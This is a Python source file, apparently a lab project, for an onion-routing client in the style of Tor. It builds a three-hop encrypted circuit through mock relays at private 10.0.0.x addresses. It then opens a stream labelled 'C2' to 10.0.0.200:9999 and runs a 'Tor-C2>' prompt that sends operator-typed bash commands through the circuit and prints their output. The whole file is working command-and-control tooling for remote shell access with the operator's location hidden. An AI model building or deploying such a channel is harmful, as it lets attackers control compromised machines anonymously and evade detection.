import SimpleTor_cell as cell
import SimpleTor_crypto_utils as crypto

import socket
import ssl
import secrets
import time
import struct
import threading

RELAY_SEARCH_TIMEOUT = 1

cellCmds = cell.CellCmd
relayCmds = cell.RelayCmd

MOCK_CONSENSUS = {
    "Node1": {
        "IP": "10.0.0.1",         
        "port": 8001,              
        "flags": ["Guard", "Middle","Exit"], 
        "pubkey": "a1b2c3d4e5f6..." 
    },

    "Node2": {
        "IP": "10.0.0.2",
        "port": 8001,
        "flags": ["Guard", "Middle","Exit"],
        "pubkey": "f6e5d4c3b2a1..."
    },

    "Node3": {
        "IP": "10.0.0.3",
        "port": 8001,
        "flags": ["Guard","Middle","Exit"],         
        "pubkey": "112233445566..."
    }
    
}

selected_relays = {}

circuits = {}


def select_node(consensus : dict, flag : str) -> dict: 
    nodes = list(consensus.keys())

    while True:
        random_node_key = secrets.choice(nodes)
        random_node = consensus[random_node_key]
        
        if flag in random_node["flags"]:
            return random_node
        

def select_relays(Tor_concensus):
    selected = []
    flags = ["Guard", "Middle", "Exit"]
    start = time.time()

    for flag in flags:
        while ((time.time() - start) < RELAY_SEARCH_TIMEOUT):
            node = select_node(Tor_concensus,flag)
            if(node not in selected):
                selected.append(node)
                break
    if(len(selected) == 3):
        return selected
    else:
        return None
    

def node_info(node: dict):
    node_ip = node["IP"]
    node_port = node["port"]
    return node_ip, node_port


def connect_to_guard(ip:str, port: int):
    raw_guard_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw_guard_sock.connect((ip, port))
    return raw_guard_sock


def generate_new_circID() -> int:
    circID = secrets.randbelow(65535) + 1
    while circID in circuits:
        circID = circID = secrets.randbelow(65535) + 1

    return circID
    


def circuit_init() -> int:

    circID = generate_new_circID()
    circuits[circID] = {
        "status": "BUILDING",
        "tmp_private_key" : None,
        "hops" : [],
        "hop_ready_event": threading.Event(),
        "c2_connected_event": threading.Event()
    }
    
    return circID
    

def build_new_circuit(guard_sock):
    circID = circuit_init()
    for i in range(3):
        if(not add_hop(circID, guard_sock)): return None
    circuits[circID]["status"] = "ACTIVE" 
    print(f"Circuit {circID} is active. 3-HOP TUNNEL BUILT")      
    return circID

def build_CREATE2_cell(circID: int, public_key : bytes) -> bytes:
    create_payload = struct.pack(">HH32s", 2, len(public_key), public_key)
    return cell.pack_cell(circID, cell.CellCmd.CREATE, create_payload)

def build_EXTEND_cell_payload(ip : str, port : int, public_key : bytes) -> bytes:
    dest_ip = socket.inet_aton(ip)
    return struct.pack(">4sH32s", dest_ip, port, public_key)

def build_EXTEND_cell_for_Middle(circID: int, circuit_status :dict, public_key:bytes) -> bytes:
    middle_relay = selected_relays[1]
    middle_relay_ip, middle_relay_port = node_info(middle_relay)
    extend_relay_payload = build_EXTEND_cell_payload(middle_relay_ip, middle_relay_port, public_key)
    fwd_hash_machine = circuit_status["hops"][0]["fwd_digest"]
    raw_extend_relay_cell = cell.pack_relayCell_with_digest(relayCmds.EXTEND,0,extend_relay_payload,fwd_hash_machine)
    fwd_aes_machine = circuit_status["hops"][0]["fwd_cipher"]
    encrypted_extend_relay_cell = fwd_aes_machine.update(raw_extend_relay_cell)
    return cell.pack_cell(circID, cellCmds.RELAY, encrypted_extend_relay_cell)
    
def build_EXTEND_cell_for_Exit(circID: int, circuit_status :dict, public_key:bytes) -> bytes:
    exit_relay = selected_relays[2]
    exit_relay_ip, exit_relay_port = node_info(exit_relay)
    extend_relay_payload = build_EXTEND_cell_payload(exit_relay_ip, exit_relay_port, public_key)
    fwd_hash_machine = circuit_status["hops"][1]["fwd_digest"]
    raw_extend_relay_cell = cell.pack_relayCell_with_digest(relayCmds.EXTEND,0,extend_relay_payload,fwd_hash_machine)
    
    middle_fwd_aes_machine = circuit_status["hops"][1]["fwd_cipher"]
    encrypted_extend_relay_cell = middle_fwd_aes_machine.update(raw_extend_relay_cell)
    
    guard_fwd_aes_machine = circuit_status["hops"][0]["fwd_cipher"]
    final_encrypted_extend_relay_cell = guard_fwd_aes_machine.update(encrypted_extend_relay_cell)
    return cell.pack_cell(circID, cellCmds.RELAY, final_encrypted_extend_relay_cell)

def add_hop(circID: int, guard_sock):
    circuit_status = circuits[circID]
    private_key, public_key = crypto.generate_ecdh_keypair()
    circuits[circID]["tmp_private_key"] = private_key
    circuit_status["hop_ready_event"].clear()

    hops_len = len(circuit_status["hops"])
    if hops_len == 0:
        guard_sock.sendall(build_CREATE2_cell(circID, public_key))
    elif hops_len == 1:
        guard_sock.sendall(build_EXTEND_cell_for_Middle(circID, circuit_status,public_key))
    elif hops_len == 2:
        guard_sock.sendall(build_EXTEND_cell_for_Exit(circID, circuit_status,public_key))    

    success = circuit_status["hop_ready_event"].wait(timeout=5.0)
    if not success: return False
    print(f"Hop {hops_len + 1} is created")
    return True
    
def decrypt_relay_cell(circ_data,relay_cell):
    constructed_hops = circ_data["hops"]
    digest_machine = constructed_hops[-1]["bwd_digest"]
    decrypted_relay_cell = relay_cell
    for i in range(len(constructed_hops)):
        decryption_cipher = constructed_hops[i]["bwd_cipher"]
        decrypted_relay_cell = decryption_cipher.update(decrypted_relay_cell)
    return decrypted_relay_cell, digest_machine
  
def handle_public_key(circ_data,relay_pub_key):
    try:
        shared_secret = crypto.compute_shared_secret(circ_data["tmp_private_key"], relay_pub_key)
        fwd_digest_key, bwd_digest_key, fwd_aes_key, bwd_aes_key = crypto.derive_tor_keys(shared_secret)
        circ_data["tmp_private_key"] = None
        fwd_cipher, bwd_cipher = crypto.create_client_ciphers(fwd_aes_key, bwd_aes_key)
        fwd_digest, bwd_digest = crypto.create_running_digests()
        fwd_digest.update(fwd_digest_key); bwd_digest.update(bwd_digest_key)
        circ_data["hops"].append({"fwd_cipher": fwd_cipher, "bwd_cipher": bwd_cipher, "fwd_digest": fwd_digest, "bwd_digest": bwd_digest})
        circ_data["hop_ready_event"].set()
    except Exception as e:
        print(f"Error deriving relay public key : {e}")

def handle_RELAY(circ_data,recvd_relay_cell):
    decrypted_relay_cell, digest_machine = decrypt_relay_cell(circ_data,recvd_relay_cell)
    relayCmd, recognized, streamID, digest, length, data = cell.unpack_relay_cell(decrypted_relay_cell)
    
    if((not cell.verify_relay_cell(decrypted_relay_cell, digest_machine)) or recognized != 0):
        print("handle_RELAY(): Digest not matched")
        return None
    
    if relayCmd == relayCmds.EXTENDED:
        handle_public_key(circ_data, data[:32])
    elif relayCmd == relayCmds.CONNECTED:
        circ_data["c2_connected_event"].set()
    elif relayCmd == relayCmds.DATA:
        output = data[:length].decode('utf-8')
        print(output, end="")

def handle_CREATED(circ_data, payload):
    HTYPE,HLEN = struct.unpack(">HH",payload[:4])
    relay_pub_key = payload[4:4+HLEN]
    
    shared_secret = crypto.compute_shared_secret(circ_data["tmp_private_key"], relay_pub_key)
    fwd_digest_key, bwd_digest_key, fwd_aes_key, bwd_aes_key = crypto.derive_tor_keys(shared_secret)
    circ_data["tmp_private_key"] = None
   
    fwd_cipher, bwd_cipher = crypto.create_client_ciphers(fwd_aes_key, bwd_aes_key)
    fwd_digest, bwd_digest = crypto.create_running_digests()
    fwd_digest.update(fwd_digest_key); bwd_digest.update(bwd_digest_key)

    new_hop = {
        "role" : "Guard",
        "ip" : selected_relays[0]["IP"],
        "port": selected_relays[0]["port"],
        "fwd_cipher": fwd_cipher, "bwd_cipher": bwd_cipher,
        "fwd_digest": fwd_digest, "bwd_digest": bwd_digest
    }
    circ_data["hops"].append(new_hop)
    circ_data["hop_ready_event"].set()

def listen_to_guard(guard_sock):
    try:
        while True:
            raw_cell = guard_sock.recv(512)
            if not raw_cell: break
            circID, cellCmd, payload = cell.unpack_cell(raw_cell)
            circ_data = circuits[circID]
            
            if cellCmd == cellCmds.CREATED:
                handle_CREATED(circ_data,payload)
            elif cellCmd == cellCmds.RELAY:
                handle_RELAY(circ_data,payload)
    except: pass
            
def init():
    global selected_relays
    selected_relays = select_relays(MOCK_CONSENSUS)
    if not selected_relays: return
    
    guard = selected_relays[0]
    guard_ip, guard_port = node_info(guard)
    guard_sock = connect_to_guard(guard_ip, guard_port)
    
    threading.Thread(target=listen_to_guard, args=(guard_sock,), daemon=True).start()

    new_circID = build_new_circuit(guard_sock)
    if new_circID == None: return 
    
    circ_data = circuits[new_circID]
    print("Sending BEGIN to open C2 stream on 10.0.0.200:9999...")
    
    begin_dest = b"10.0.0.200:9999\x00"
    exit_fwd_hash = circ_data["hops"][2]["fwd_digest"]
    raw_begin_cell = cell.pack_relayCell_with_digest(relayCmds.BEGIN, 1, begin_dest, exit_fwd_hash)
    
    enc_payload = raw_begin_cell
    for i in reversed(range(3)):
        enc_payload = circ_data["hops"][i]["fwd_cipher"].update(enc_payload)
        
    guard_sock.sendall(cell.pack_cell(new_circID, cellCmds.RELAY, enc_payload))
    
    if not circ_data["c2_connected_event"].wait(timeout=5.0):
        print("C2 Connection timed out.")
        return
        
    print("C2 Stream CONNECTED. You can now type bash commands.")
    print("-" * 50)
    
    while True:
        cmd_input = input("Tor-C2> ")
        if cmd_input.lower() in ['exit', 'quit']: break
        if not cmd_input: continue

        cmd_bytes = cmd_input.encode('utf-8')
        exit_fwd_hash = circ_data["hops"][2]["fwd_digest"]
        raw_data_cell = cell.pack_relayCell_with_digest(relayCmds.DATA, 1, cmd_bytes, exit_fwd_hash)
        
        enc_payload = raw_data_cell
        for i in reversed(range(3)):
            enc_payload = circ_data["hops"][i]["fwd_cipher"].update(enc_payload)
            
        guard_sock.sendall(cell.pack_cell(new_circID, cellCmds.RELAY, enc_payload))
        time.sleep(0.5)

if __name__ == "__main__":
    init()